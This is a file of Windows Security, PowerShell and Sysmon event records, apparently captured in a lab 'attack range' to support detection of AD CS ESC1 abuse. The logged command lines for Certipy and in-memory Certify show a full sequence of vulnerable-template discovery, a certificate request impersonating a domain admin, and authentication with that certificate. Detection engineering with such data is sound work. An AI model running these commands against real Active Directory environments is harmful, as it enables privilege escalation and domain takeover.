#Bulk AD CS Events
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:47:37.394191200Z'/><EventRecordID>1830975491</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='4068'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>4</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:dns=victim_machine.attack_range.local&amp;upn=victim_admin_user</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0C</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:47:37.383787800Z'/><EventRecordID>1830975490</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='4068'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>4</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:dns=victim_machine.attack_range.local&amp;upn=victim_admin_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:22:39.441591600Z'/><EventRecordID>1830974652</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>3</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:dns=victim_machine.attack_range.local</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0B</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:22:39.431500200Z'/><EventRecordID>1830974651</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>3</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:dns=victim_machine.attack_range.local</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:19:12.171703300Z'/><EventRecordID>1830974509</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>2</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-05-25T12:19:12.080465500Z'/><EventRecordID>1830974507</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>1</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data></EventData></Event>
#PowerShell in memory certify
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:54:02.171703300Z'/><EventRecordID>1830974609</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>7</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:54:01.2266761Z'/><EventRecordID>1830974607</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>7</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-06-09T14:53:55.2051612Z'/><EventRecordID>1350025</EventRecordID><Correlation ActivityID='{3e02b68e-9971-0006-a41b-063e7199d901}'/><Execution ProcessID='18992' ThreadID='14176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-21-522199786-2069634556-312552118-87710'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>[Certify.Program]::Main("request /ca:cert_authority.attack_range.local\Attack Range Cert Authority /template:cert_authority.attack_range.local\Attack Range Cert Authority /altuser:victim_admin_user".Split())</Data><Data Name='ScriptBlockId'>35cc5131-c1e3-4308-81aa-517eb2fec231</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-06-09T14:50:52.5720377Z'/><EventRecordID>1350023</EventRecordID><Correlation ActivityID='{3e02b68e-9971-0005-80ee-033e7199d901}'/><Execution ProcessID='18992' ThreadID='14176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-21-522199786-2069634556-312552118-87710'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>[Certify.Program]::Main("find /vulnerable".Split())</Data><Data Name='ScriptBlockId'>f4f05710-9c23-4047-bcf2-ec29d78bf102</Data><Data Name='Path'></Data></EventData></Event>
#Certipy
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>14339</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:52.1252039Z'/><EventRecordID>1830975591</EventRecordID><Correlation/><Execution ProcessID='844' ThreadID='8416'/><Channel>Security</Channel><Computer>dc.attack_range.local</Computer><Security/></System><EventData><Data Name='TargetUserName'>victim_admin_user</Data><Data Name='TargetDomainName'>attack_range</Data><Data Name='TargetSid'>attack_range\victim_admin_user</Data><Data Name='ServiceName'>krbtgt</Data><Data Name='ServiceSid'>attack_range\krbtgt</Data><Data Name='TicketOptions'>0x40800010</Data><Data Name='Status'>0x0</Data><Data Name='TicketEncryptionType'>0x12</Data><Data Name='PreAuthType'>16</Data><Data Name='IpAddress'>192.168.1.10</Data><Data Name='IpPort'>49314</Data><Data Name='CertIssuerName'>Attack Range Cert Authority</Data><Data Name='CertSerialNumber'>7F00049982010D5A76DE2C8AD0000000012345</Data><Data Name='CertThumbprint'>F4B9F00E378950153F18C0E8C5F38DBCF1712345</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:51.1880244Z'/><EventRecordID>3206466</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5900'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Kerberos</Data><Data Name='UtcTime'>2023-06-09 14:48:48.719</Data><Data Name='ProcessGuid'>{78198d03-3bcf-6483-8083-c60c00000000}</Data><Data Name='ProcessId'>8352</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.1.10</Data><Data Name='SourceHostname'>attack_pc.attack_range.local</Data><Data Name='SourcePort'>2411</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.2.10</Data><Data Name='DestinationHostname'>dc.attack_range.local</Data><Data Name='DestinationPort'>88</Data><Data Name='DestinationPortName'>kerberos</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:51.1879338Z'/><EventRecordID>3206465</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5900'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Kerberos</Data><Data Name='UtcTime'>2023-06-09 14:48:48.619</Data><Data Name='ProcessGuid'>{78198d03-3bcf-6483-8083-c60c00000000}</Data><Data Name='ProcessId'>8352</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.1.10</Data><Data Name='SourceHostname'>attack_pc.attack_range.local</Data><Data Name='SourcePort'>2410</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.2.10</Data><Data Name='DestinationHostname'>dc.attack_range.local</Data><Data Name='DestinationPort'>88</Data><Data Name='DestinationPortName'>kerberos</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:49.1252039Z'/><EventRecordID>3206464</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:48:49.118</Data><Data Name='ProcessGuid'>{78198d03-3bcf-6483-8083-c60c00000000}</Data><Data Name='ProcessId'>8352</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\victim_admin_user.ccache</Data><Data Name='CreationUtcTime'>2023-06-09 14:38:01.005</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:46.5640418Z'/><EventRecordID>3206448</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:48:46.560</Data><Data Name='ProcessGuid'>{78198d03-3bce-6483-d834-c50c00000000}</Data><Data Name='ProcessId'>100</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>certipy.exe  auth -pfx victim_admin_user.pfx -username victim_admin_user -domain attack_range.local</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-3ad1-6483-0afa-bc0c00000000}</Data><Data Name='LogonId'>0xcbcfa0a</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7A7DC777AD1EB059A120F382155497CB,SHA256=21AD41408CA97A5F8830AC482686F4F3E5A85A35B93808DEBC542F48D68D8812,IMPHASH=BA5546933531FAFA869B1F86A4E2A959</Data><Data Name='ParentProcessGuid'>{78198d03-3ad1-6483-a9fd-bc0c00000000}</Data><Data Name='ParentProcessId'>5388</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:13.3638227Z'/><EventRecordID>3206447</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:48:13.360</Data><Data Name='ProcessGuid'>{78198d03-3ba4-6483-3932-c40c00000000}</Data><Data Name='ProcessId'>3172</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\victim_admin_user.pfx</Data><Data Name='CreationUtcTime'>2023-06-09 14:37:01.005</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4887</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:11.171703300Z'/><EventRecordID>1830974409</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>6</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data><Data Name='Disposition'>3</Data><Data Name='SubjectKeyIdentifier'>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A</Data><Data Name='Subject'>CN=attack_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4886</EventID><Version>0</Version><Level>0</Level><Task>12805</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:10.2266761Z'/><EventRecordID>1830974407</EventRecordID><Correlation ActivityID='{28AAD79F-81AB-0001-BED7-AA28AB81D901}'/><Execution ProcessID='668' ThreadID='3160'/><Channel>Security</Channel><Computer>cert_authority.attack_range.local</Computer><Security/></System><EventData><Data Name='RequestId'>6</Data><Data Name='Requester'>attack_range\attack_user</Data><Data Name='Attributes'>CertificateTemplate:VulnerableTemplate_ESC1
SAN:upn=victim_admin_user</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:48:03.2264248Z'/><EventRecordID>3206430</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:48:03.222</Data><Data Name='ProcessGuid'>{78198d03-3ba3-6483-71e3-c20c00000000}</Data><Data Name='ProcessId'>6908</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>certipy.exe  req -u attack_user@attack_range.local -ca "Attack Range Cert Authority" -target cert_authority.attack_range.local -template "VulnerableTemplate_ESC1" -upn victim_admin_user</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-3ad1-6483-0afa-bc0c00000000}</Data><Data Name='LogonId'>0xcbcfa0a</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7A7DC777AD1EB059A120F382155497CB,SHA256=21AD41408CA97A5F8830AC482686F4F3E5A85A35B93808DEBC542F48D68D8812,IMPHASH=BA5546933531FAFA869B1F86A4E2A959</Data><Data Name='ParentProcessGuid'>{78198d03-3ad1-6483-a9fd-bc0c00000000}</Data><Data Name='ParentProcessId'>5388</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:51.0389267Z'/><EventRecordID>3206426</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:46:51.024</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609104650_Certipy.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:51.024</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:51.0381103Z'/><EventRecordID>3206425</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:46:51.024</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609104650_Certipy.txt</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:51.024</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:50.4834561Z'/><EventRecordID>3206424</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:46:50.482</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609104650_templates.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:50.482</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:50.4819463Z'/><EventRecordID>3206423</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:46:50.466</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609104650_cas.json</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:50.466</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:50.4816688Z'/><EventRecordID>3206422</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Testing</Data><Data Name='UtcTime'>2023-06-09 14:46:50.466</Data><Data Name='ProcessGuid'>{78198d03-3b4d-6483-e53e-c10c00000000}</Data><Data Name='ProcessId'>4136</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='TargetFilename'>C:\Users\attack_user\Desktop\Temp\20230609104650_Certipy.zip</Data><Data Name='CreationUtcTime'>2023-06-09 14:46:50.466</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-06-09T14:46:36.2785809Z'/><EventRecordID>3206406</EventRecordID><Correlation/><Execution ProcessID='3916' ThreadID='5888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>attack_pc.attack_range.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-06-09 14:46:36.274</Data><Data Name='ProcessGuid'>{78198d03-3b4c-6483-2ec6-bf0c00000000}</Data><Data Name='ProcessId'>11192</Data><Data Name='Image'>C:\Users\attack_user\Desktop\Temp\certipy.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>certipy.exe  find -vulnerable -username attack_user@attack_range.local</Data><Data Name='CurrentDirectory'>C:\Users\attack_user\Desktop\Temp\</Data><Data Name='User'>attack_range\attack_user</Data><Data Name='LogonGuid'>{78198d03-3ad1-6483-0afa-bc0c00000000}</Data><Data Name='LogonId'>0xcbcfa0a</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7A7DC777AD1EB059A120F382155497CB,SHA256=21AD41408CA97A5F8830AC482686F4F3E5A85A35B93808DEBC542F48D68D8812,IMPHASH=BA5546933531FAFA869B1F86A4E2A959</Data><Data Name='ParentProcessGuid'>{78198d03-3ad1-6483-a9fd-bc0c00000000}</Data><Data Name='ParentProcessId'>5388</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\WINDOWS\system32\cmd.exe" </Data></EventData></Event>
